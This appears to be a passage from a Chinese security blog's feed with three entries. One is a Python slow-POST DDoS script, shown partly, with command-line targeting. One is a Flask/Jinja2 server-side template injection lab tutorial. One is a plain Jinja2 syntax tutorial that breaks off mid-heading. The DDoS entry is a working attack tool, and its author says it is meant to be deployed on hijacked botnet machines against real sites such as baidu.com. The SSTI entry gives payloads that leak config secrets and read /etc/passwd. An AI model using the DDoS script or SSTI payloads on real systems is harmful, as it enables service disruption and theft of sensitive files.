class="hljs-attribute">send_th</span>=threading.Thread(target=send_thread,args=())<br>conn_th.start()<br>send_th.start()<br><br><br></code></pre></td></tr></table></figure><p>这里我们仅设置了10个最大连接数，然后向百度的80端口不断发送post请求。</p><p>效果如下：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_ddos/ddos01.png"></p><h2 id="0x03-增加命令行参数"><a href="#0x03-增加命令行参数" class="headerlink" title="0x03 增加命令行参数"></a>0x03 增加命令行参数</h2><p>实际情况中，我们经常要把ddos脚本放在我们已经控制的僵尸网络中，控制大量的计算机启动脚本，我们肯定不能每切换攻击一个目标就对代码中的参数更改一次，所以我们要使目标ip，端口，页面，以及攻击的强度通过我们输入参数来更改，为实现这个目标，我们导入optparse库接收命令行参数。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#python3.6</span><br><br><span class="hljs-comment">#用例：python ddos.py -w &quot;www.hao123.com&quot; -p 80 -n 200 --page &quot;/&quot;</span><br><span class="hljs-comment">#-h查看帮助</span><br><span class="hljs-comment">#-w参数和-p参数不可缺省</span><br><br>import optparse<br>import socket<br>import time<br>import threading<br><br><br>socks=[]<br><br>def conn_thread(PORT,HOST,data2,MAX_CONN):<br>    global socks<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,MAX_CONN):<br>        <span class="hljs-attribute">s</span>=socket.socket (socket.AF_INET,socket.SOCK_STREAM)<br>        try:<br>            s.connect((HOST,PORT))<br>            s.send(data2)<br>            <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;[+] Send data OK!,conn=%d\n&quot;</span> % i)<br>            socks.append(s)<br>        except:<br>            <span class="hljs-builtin-name">print</span> (<span class="hljs-string">&quot;[-] Could not connect to server or send error&quot;</span>)<br>            time.sleep(5)<br><br><br>def send_thread():<br>    global socks<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> socks:<br>            try:<br>                s.send(b<span class="hljs-string">&quot;f&quot;</span>)<br>                <span class="hljs-builtin-name">print</span> (<span class="hljs-string">&quot;[+] send OK! %s&quot;</span>%s)<br>            except:<br>                <span class="hljs-builtin-name">print</span> (<span class="hljs-string">&quot;[-] send error\n&quot;</span>)<br>                socks.<span class="hljs-builtin-name">remove</span>(s)<br>                s.close()<br>        time.sleep(1)<br><br><br>def main():<br>    MAX_CONN = 10<br>   <span class="hljs-built_in"> PORT </span>= 80<br>    HOST = <span class="hljs-string">&quot;www.baidu.com&quot;</span><br>   <span class="hljs-built_in"> PAGE </span>= <span class="hljs-string">&quot;/&quot;</span><br>    MAX_CONN = 10<br><br>    parser = optparse.OptionParser()<br>    parser.add_option(<span class="hljs-string">&#x27;-w&#x27;</span>, <span class="hljs-attribute">dest</span>=<span class="hljs-string">&#x27;HOST&#x27;</span>, <span class="hljs-attribute">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-attribute">help</span>=<span class="hljs-string">&quot;IP address or Website&quot;</span>)<br>    parser.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-attribute">dest</span>=<span class="hljs-string">&#x27;PORT&#x27;</span>, <span class="hljs-attribute">type</span>=<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-attribute">help</span>=<span class="hljs-string">&quot;Port num&quot;</span>)<br>    parser.add_option(<span class="hljs-string">&#x27;-n&#x27;</span>, <span class="hljs-attribute">dest</span>=<span class="hljs-string">&#x27;MAX_CONN&#x27;</span>, <span class="hljs-attribute">type</span>=<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-attribute">help</span>=<span class="hljs-string">&quot;Max connect num&quot;</span>)<br>    parser.add_option(<span class="hljs-string">&#x27;--page&#x27;</span>, <span class="hljs-attribute">dest</span>=<span class="hljs-string">&#x27;PAGE&#x27;</span>, <span class="hljs-attribute">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-attribute">help</span>=<span class="hljs-string">&quot;Url page&quot;</span>)<br>    (options, args) = parser.parse_args()<br>    <span class="hljs-keyword">if</span>(options.<span class="hljs-attribute">HOST</span>==None)|(options.PORT==None):<br>        <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&#x27;---wrong input!---&#x27;</span>+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        exit(0)<br>    <span class="hljs-keyword">else</span>:<br>        HOST = options.HOST<br>       <span class="hljs-built_in"> PORT </span>= options.PORT<br>    <span class="hljs-keyword">if</span>(options.PAGE):<br>       <span class="hljs-built_in"> PAGE </span>= options.PAGE<br>    <span class="hljs-keyword">if</span>(options.MAX_CONN):<br>        MAX_CONN = options.MAX_CONN<br><br>    data = (<span class="hljs-string">&quot;POST %s HTTP/1.1\r\n&quot;</span><br>            <span class="hljs-string">&quot;Host: %s\r\n&quot;</span><br>            <span class="hljs-string">&quot;Content-Length: 1000000000\r\n&quot;</span><br>            <span class="hljs-string">&quot;Cookie: ddos_test\r\n&quot;</span><br>             <span class="hljs-string">&quot;\r\n&quot;</span> % (PAGE, HOST))<br>    <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;****************************&quot;</span>)<br>    <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;****************************&quot;</span>)<br>    <span class="hljs-builtin-name">print</span>(data)<br>    <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;MAX_CONN=&#123;0&#125;&quot;</span>.format(MAX_CONN))<br>    <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;****************************&quot;</span>)<br>    <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;****************************&quot;</span>)<br>    data2 = data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    time.sleep(5)<br>    <span class="hljs-attribute">conn_th</span>=threading.Thread(target=conn_thread,args=(PORT,HOST,data2,MAX_CONN))<br>    <span class="hljs-attribute">send_th</span>=threading.Thread(target=send_thread,args=())<br>    conn_th.start()<br>    send_th.start()<br><br><br><span class="hljs-keyword">if</span> __name__ ==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>我们通过optparse库读取命令行输入参数，其中host和port是必要参数，max_conn和page是可选参数。</p><p>效果如下：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_ddos/ddos02.png"></p><p>我们植入肉鸡后，就可以通过命令行调用程序并选择攻击目标了。</p><h2 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h2><p>blog中所有写好的工具，以及常用的木马、字典，都放在<br><a href="https://github.com/echohun/tools">https://github.com/echohun/tools</a> 感兴趣的大佬们可以star一下，十分感激。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>ddos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI服务器模板注入</title>
    <link href="/2018/05/28/SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2018/05/28/SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间打本校的ctf，有道叫幸运数字的题，只挖到一个xss，看了很久对题完全没有头绪，后来交wp的时候，出题师傅在群里说是SSTI，然后就去百度了一下，复现并学习一下这个漏洞。</p><h2 id="0x01-SSTI服务端模板注入"><a href="#0x01-SSTI服务端模板注入" class="headerlink" title="0x01 SSTI服务端模板注入"></a>0x01 SSTI服务端模板注入</h2><p>服务端模板注入是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>通常测试模块类型的方式如下图：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti01.png"></p><h2 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h2><p>前面两篇正好写了python的后端模块flask和jinja2，这次我们使用flask+jinja2框架来测试一下。</p><p>首先后端是python，所以需要python环境，python在官网下载并安装，配置环境变量即可。</p><p>接着我们安装需要用到的库</p><ul><li>pip install jinja2</li><li>pip install flask</li><li>pip install virtualenv</li></ul><p>只要上述所有库成功安装，环境就配置完毕了。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>我们的环境需要一个run.py文件和一个templates文件夹，templates文件夹内要有一个index.html。</p><p>index.html内容如下：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">block</span></span> title %&#125;</span><span class="xml">test pages</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endblock</span></span> %&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>请输入你的昵称<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/check&quot;</span>&gt;</span></span><br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">required</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>可以看到，html中只有一个post型的from需要我们填写提交。</p><p>然后是run.py（注意这次我用了python2.7）:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2.7</span><br><span class="hljs-keyword">import</span> jinja2<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template, render_template_string, flash, redirect, url_for, request<br><br>app = Flask(__name__)<br>app.config.from_object(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&quot;password:123456789&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/check&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>():</span><br><span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>name = <span class="hljs-built_in">str</span>(request.form[<span class="hljs-string">&#x27;name&#x27;</span>])<br>template = <span class="hljs-string">u&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;center&gt;</span><br><span class="hljs-string">&lt;p&gt;你好, %s, 欢迎来到我的页面&lt;/p&gt;</span><br><span class="hljs-string">&lt;a href=&quot;/&quot;&gt;点这里退出&lt;/a&gt;</span><br><span class="hljs-string">&lt;/center&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> % (name)<br><span class="hljs-keyword">return</span> render_template_string(template)<br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page_not_found</span>(<span class="hljs-params">e</span>):</span><br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;404.html&#x27;</span>),<span class="hljs-number">404</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>这里python文件实现了将几个页面通过jinja2模块渲染部署，然后添加了一个敏感数据SECRET_KEY一会用得到，剩下的就是将index.html页面post过来的name，在网站check路径的页面中作为字符串输出。</p><p>我们在run.py目录打开命令行先输入python run.py先将服务运行起来：</p><p>然后我们打开浏览器输入127.0.0.1:5000，成功显示index.html中的页面：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti02.png"></p><p>我们输入任意字符串，浏览器跳转到127.0.0.1:5000/check目录，并且在网页中输出我们的字符串：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti03.png"></p><p>如上几步如果都成功，我们漏洞环境就搭建完成了。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>我们先尝试一下刚才图中的测试数据，输入</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-string">&#x27;7&#x27;</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>发现结果如下：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti04.png"></p><p>config是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。查看这些配置项目，我们只需注入如下命令</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.items</span>() &#125;&#125;</span><br></code></pre></td></tr></table></figure><p>发现结果中存在我们刚才故意放进去的敏感信息：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti05.png"></p><p>在接下来的步骤之前，我先介绍两个内省实用程序：__mro__以及__subclasses__属性。</p><p>__mro__中的MRO(Method Resolution Order)代表着解析方法调用的顺序，它是每个对象元类的一个隐藏属性，当进行内省时会忽略dir输出。</p><p>__subclasses__属性在这里作为一种方法被定义为，对每个new-style class“为它的直接子类维持一个弱引用列表”，之后“返回一个包含所有存活引用的列表”。</p><p>__mro__允许我们在当前Python环境中追溯对象继承树，之后__subclasses__又让我们回到原点。从一个new-style object开始，例如str类型。使用__mro__我们可以从继承树爬到根对象类，之后在Python环境中使用__subclasses__爬向每一个new-style object。ok，这让我们能够访问加载到当前Python环境下的所有类。这样，我们就可以实现很多功能。</p><p>首先我们要做的第一件事便是选择一个new-style object用于访问object基类。我们可以使用__mro__属性访问对象的继承类。<br>输入</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span> &#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti06.png"></p><p>得到反馈只有str、basestring和object，按照数组的排序，我们应该选__mro__的第三个，也就是__mro__[2]，接下来我们构造</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__() &#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti07.png"></p><p>可以查看到非常非常多的可访问类，这个时候我们要找到&lt;type ‘file’&gt;类，它是文件系统访问的关键。</p><p>然后我们可以用file类的read()方法访问一下当前目录的文本：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[40](<span class="hljs-name">&#x27;./2333.txt&#x27;</span>).read() &#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti08.png"></p><p>访问敏感目录可以得到很多信息：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[40](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti09.png"></p><p>我们就可以参考目标系统目录结构，对目标系统敏感文件进行访问。</p><h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><ul><li><a href="https://portswigger.net/blog/server-side-template-injection">https://portswigger.net/blog/server-side-template-injection</a></li><li><a href="http://www.freebuf.com/articles/web/98619.html">http://www.freebuf.com/articles/web/98619.html</a></li><li><a href="https://nvisium.com/blog/2015/12/07/injecting-flask/">https://nvisium.com/blog/2015/12/07/injecting-flask/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>SSTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python-jinja2模块学习</title>
    <link href="/2018/05/28/python-jinja2%E6%A8%A1%E5%9D%97%E5%AD%A6%E4%B9%A0/"/>
    <url>/2018/05/28/python-jinja2%E6%A8%A1%E5%9D%97%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上次总结了python flask模板，flask模板是一个包含响应文本的文件，其中包含用占位变量表示的动态部分，其具体指只在请求的上下文中才能知道。使用真是只替换变量，再返回最终得到的响应字符串，这一过程称为渲染。为了渲染模板，Flask使用了一个名为Jinja2的强大模板引擎。这次记录一下jinja2模块的学习，用作笔记。</p><h2 id="0x01-jinja2"><a href="#0x01-jinja2" class="headerlink" title="0x01 jinja2"></a>0x01 jinja2</h2><p>Jinja2是基于python的模板引擎，功能比较类似于于PHP的smarty，J2ee的Freemarker和velocity。 它能完全支持unicode，并具有集成的沙箱执行环境。jinja2使用BSD授权。起初是Flask作者模仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。</p><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><p>python库的安装都十分方便，jinja2也不例外，我们直接在命令行输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pip</span> install jinja<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>即可安装。</p><h2 id="0x03-基本语法"><a href="#0x03-基本语法" class="headerlink" title="0x03 基本语法"></a>0x03 基本语法</h2><p>在jinja2中，存在三种语法：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal">控制结构 <span class="hljs-template-variable">&#123;% %&#125;</span><br>变量取值 <span class="hljs-template-variable">&#123;&#123; &#125;&#125;</span><br>注释 &#123;<span class="hljs-comment"># #&#125;</span><br></code></pre></td></tr></table></figure><h2 id="0x04-变量"><a href="#0x04-变量" class="headerlink" title="0x04 变量"></a>0x04 变量</h2><p>jinja2模板中使用两个花括号嵌套 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。</p><p>如</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>this is a dicectory:</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">mydict</span>[&#x27;key&#x27;] &#125;&#125;</span><span class="xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>this is a list:</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">mylist</span>[3] &#125;&#125;</span><span class="xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>this is a object:</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">myobject.something</span>() &#125;&#125;</span><span class="xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="0x05-过滤器"><a href="#0x05-过滤器" class="headerlink" title="0x05 过滤器"></a>0x05 过滤器</h2><p>花括号中的变量传输进来时，我们要对其进行一些对字符串的常规操作或者提升安全性的操作，这个时候可以使用jinja2自带的过滤器。</p><p>常用的过滤器：</p><table><thead><tr><th>过滤器</th><th>说明</th></tr></thead><tbody><tr><td>safe</td><td>渲染时值不转义</td></tr><tr><td>capitialize</td><td>把值的首字母转换成大写，其他子母转换为小写</td></tr><tr><td>lower</td><td>把值转换成小写形式</td></tr><tr><td>upper</td><td>把值转换成大写形式</td></tr><tr><td>title</td><td>把值中每个单词的首字母都转换成大写</td></tr><tr><td>trim</td><td>把值的首尾空格去掉</td></tr><tr><td>striptags</td><td>渲染之前把值中所有的HTML标签都删掉</td></tr><tr><td>join</td><td>拼接多个值为字符串</td></tr><tr><td>replace</td><td>替换字符串的值</td></tr><tr><td>round</td><td>默认对数字进行四舍五入，也可以用参数进行控制</td></tr><tr><td>int</td><td>把值转换成整型</td></tr></tbody></table><p>过滤器的用法是在变量后面使用管道(|)分割，多个过滤器可以链式调用，前一个过滤器的输出会作为后一个过滤器的输入。</p><p>如：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;abc&#x27;</span> | upper  &#125;&#125;</span><br><span class="xml"># ABC</span><br><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;hello world&#x27;</span> | title  &#125;&#125;</span><br><span class="xml"># Hello World</span><br><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">18.18</span> | round | int &#125;&#125;</span><br><span class="xml"># 18</span><br></code></pre></td></tr></table></figure><h2 id="0x06-分支"><a href="#0x06-分支" class="headerlink" title="0x06 分支"></a>0x06 分支</h2><p>jinja2中的if语句类似与Python的if语句，它也具有单分支，多分支等多种结构，不同的是，条件语句不需要使用冒号结尾，而结束控制语句，需要使用endif关键字。</p><p>如：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> grade&gt;=90 %&#125;</span><br><span class="xml">excellent</span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">elif</span></span> grade&gt;=60 %&#125;</span><br><span class="xml">great</span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">else</span></span> %&#125;</span><br><span class="xml">bad</span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h2 id="0x07-循环"><a href="#0x07-循环" class="headerlink" title="0x07 循环"></a>0x07 